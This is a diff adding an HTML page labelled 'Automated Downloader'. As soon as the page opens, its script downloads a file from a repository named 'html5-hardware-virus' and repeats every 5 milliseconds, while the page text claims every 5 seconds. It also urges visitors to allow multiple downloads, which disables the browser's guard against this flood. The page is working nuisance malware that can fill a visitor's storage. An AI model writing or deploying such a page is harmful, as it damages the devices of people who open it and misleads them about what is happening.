@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Downloader</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: #f4f4f9;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            display: inline-block;
+        }
+        h1 {
+            color: #333;
+        }
+        #counter {
+            font-size: 24px;
+            font-weight: bold;
+            color: #007BFF;
+            margin-top: 20px;
+        }
+        .note {
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Automated Downloader</h1>
+        <p>Downloading the specified file every 5 seconds...</p>
+        <div id="counter">Downloads triggered: 0</div>
+        <p class="note">Note: You may need to look at your browser bar and click "Allow multiple downloads" if it blocks them.</p>
+    </div>
+
+    <script>
+        const fileUrl = "https://raw.githubusercontent.com/CameronCodesStuff/html5-hardware-virus/main/download.txt";
+        let downloadCount = 0;
+
+        function triggerDownload() {
+            const downloadLink = document.createElement('a');
+            downloadLink.href = fileUrl;
+            
+            downloadLink.setAttribute('download', 'download.txt');
+            
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+
+            downloadCount++;
+            document.getElementById('counter').innerText = "Downloads triggered: " + downloadCount;
+        }
+
+        triggerDownload();
+
+        setInterval(triggerDownload, 5);
+    </script>
+
+</body>
+</html>
